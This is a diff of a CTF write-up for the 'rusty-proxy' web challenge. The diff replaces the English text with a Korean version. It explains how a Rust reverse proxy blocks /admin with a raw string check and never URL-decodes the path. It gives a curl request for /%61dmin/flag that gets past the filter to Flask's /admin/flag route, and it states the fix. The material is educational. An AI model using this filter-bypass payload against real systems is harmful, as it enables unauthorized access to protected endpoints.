@@ -15,45 +15,35 @@ comments: false
 - **Name:** rusty-proxy
 - **Category:** Web
 - **Description:** I just vibecoded a highly secure reverse proxy using rust, I hope it works properly.
-- **Difficulty:** ★☆☆☆☆
+- **Connection:** `http://<TARGET>`
+- **Flag format:** `BITSCTF{...}`
 
 ---
 
-## TL;DR
+### 개요
 
-The Rust proxy blocks `/admin` paths using a plain string check — no URL decoding.
-Sending `/%61dmin/flag` passes the proxy (`` %61 `` ≠ `a` to the proxy), but Flask on the backend decodes `%61` → `a` and routes it to `/admin/flag`.
-
-```bash
-curl "http://<TARGET>/%61dmin/flag"
-```
-
----
-
-## Overview
+Rust로 만든 리버스 프록시 앞에 Flask 백엔드가 숨어 있는 구조입니다.
 
 ```
-[Client]
+[클라이언트]
     │
     ▼
-[Rust Proxy :80]
-  blocks /admin paths
+[Rust 프록시 :80]
+  /admin 경로 차단
     │
     ▼
-[Flask Backend :8080]
-  /admin/flag → returns FLAG
+[Flask 백엔드 :8080]
+  /admin/flag → FLAG 반환
 ```
 
-- `proxy/src/main.rs` — Rust reverse proxy with path filter
-- `backend/server.py` — Flask backend that holds the flag
+플래그는 Flask의 `/admin/flag`에 있지만,
+프록시가 `/admin` 경로를 모두 막고 있습니다.
 
 ---
 
-## Solution
+### 소스 분석
 
-### 1) Recon
-
-The Flask backend exposes the flag at `/admin/flag`:
+#### backend/server.py — 플래그 위치 확인
 
 ```python
 FLAG = os.getenv("FLAG", "BITSCTF{fake_flag}")
@@ -63,13 +53,12 @@ def vault():
     return jsonify({"flag": FLAG})
 ```
 
-Direct access is blocked by the proxy sitting in front of it.
+Flask는 `/admin/flag`로 요청이 오면 플래그를 반환합니다.
+직접 접근할 수만 있다면 끝입니다.
 
----
+#### proxy/src/main.rs — 경로 필터 확인
 
-### 2) Root Cause
-
-The proxy's path filter in `main.rs`:
+프록시가 어떻게 경로를 차단하는지 봅니다.
 
 ```rust
 fn is_path_allowed(path: &str) -> bool {
@@ -81,73 +70,78 @@ fn is_path_allowed(path: &str) -> bool {
 }
 ```
 
-It compares the raw URL string **without decoding** it first.
+경로를 소문자로 변환한 뒤 `/admin`으로 시작하면 차단합니다.
 
-| Request path | Proxy sees | Starts with `/admin`? | Result |
-|---|---|---|---|
-| `/admin/flag` | `/admin/flag` | ✅ YES | **Blocked** |
-| `/%61dmin/flag` | `/%61dmin/flag` | ❌ NO | **Passes** ✅ |
-
-`%61` is the URL-encoded form of `a`.
-The proxy doesn't decode it, so the check is bypassed.
-Flask/Werkzeug decodes `%61` → `a` as per HTTP standard and routes to `/admin/flag`.
+여기서 중요한 점이 하나 있습니다.
+`path.to_lowercase()`만 할 뿐, **URL 디코딩을 하지 않습니다.**
 
 ---
 
-### 3) Exploit Strategy
+### 취약점 분석
 
-URL-encode the `a` in `admin` to bypass the proxy's string check.
+URL 인코딩에서 `a`는 `%61`입니다.
 
-```
-Normal:   /admin/flag
-Encoded:  /%61dmin/flag
-           ^^^
-           'a' encoded as %61
-```
+프록시에게 `/%61dmin/flag`는 어떻게 보일까요?
 
-Attack flow:
-
-```
-1. Client sends /%61dmin/flag
-        ↓
-2. Rust proxy: starts_with("/admin")? → NO → passes
-        ↓
-3. Flask decodes %61 → a → routes to /admin/flag
-        ↓
-4. FLAG returned
-```
-
----
-
-### 4) Why It Works
-
-The proxy and backend interpret the URL differently:
-
-**Rust proxy** — treats the URL as a raw string, no decoding:
 ```rust
-// %61dmin ≠ admin → check passes
-normalized.starts_with("/admin")
+normalized = "/%61dmin/flag"
+normalized.starts_with("/admin")  // → false
+// → 차단하지 않고 통과
 ```
 
-**Flask/Werkzeug** — decodes percent-encoded characters per HTTP spec:
+`%61`을 그대로 문자열로 비교하기 때문에 `/admin`과 다르다고 판단합니다.
+
+Flask/Werkzeug는 HTTP 표준에 따라 `%61`을 `a`로 디코딩합니다.
+
 ```python
-# %61 → a → /admin/flag is matched
-@app.route('/admin/flag')
+# /%61dmin/flag 요청 수신
+# %61 → a 디코딩
+# → /admin/flag 라우트 매칭
 ```
 
-This is a classic **Parser Differential** bug — when a security filter and the actual handler parse input differently, the filter can always be bypassed.
+같은 URL을 프록시와 Flask가 **다르게 해석**합니다.
+프록시는 필터를 통과시키고, Flask는 `/admin/flag`로 처리합니다.
 
-> **Fix:** Always decode URLs before applying security checks, using the same logic as the backend.
+| 요청 경로 | 프록시가 보는 값 | `/admin`으로 시작? | 결과 |
+|---|---|---|---|
+| `/admin/flag` | `/admin/flag` | YES | 차단 ❌ |
+| `/%61dmin/flag` | `/%61dmin/flag` | NO | 통과 ✅ |
 
 ---
 
-## Solver
+### Exploit 실행 과정
+
+`admin`의 `a`를 `%61`로 인코딩해서 요청을 보냅니다.
 
 ```bash
 curl "http://<TARGET>/%61dmin/flag"
 ```
 
-Response:
+실행 결과:
+
 ```json
 {"flag": "BITSCTF{...}"}
 ```
+
+---
+
+### FLAG
+
+```
+BITSCTF{...}
+```
+
+---
+
+### 요약
+
+이 문제의 핵심은 **Parser Differential**입니다.
+
+보안 필터(Rust 프록시)와 실제 핸들러(Flask)가
+같은 URL을 다르게 파싱할 때, 필터는 언제나 우회할 수 있습니다.
+
+프록시는 URL을 raw 문자열로 비교하고,
+Flask는 percent-encoding을 디코딩해서 라우팅합니다.
+
+수정 방법은 단순합니다.
+보안 검사 전에 백엔드와 동일한 방식으로 URL을 디코딩하면 됩니다.
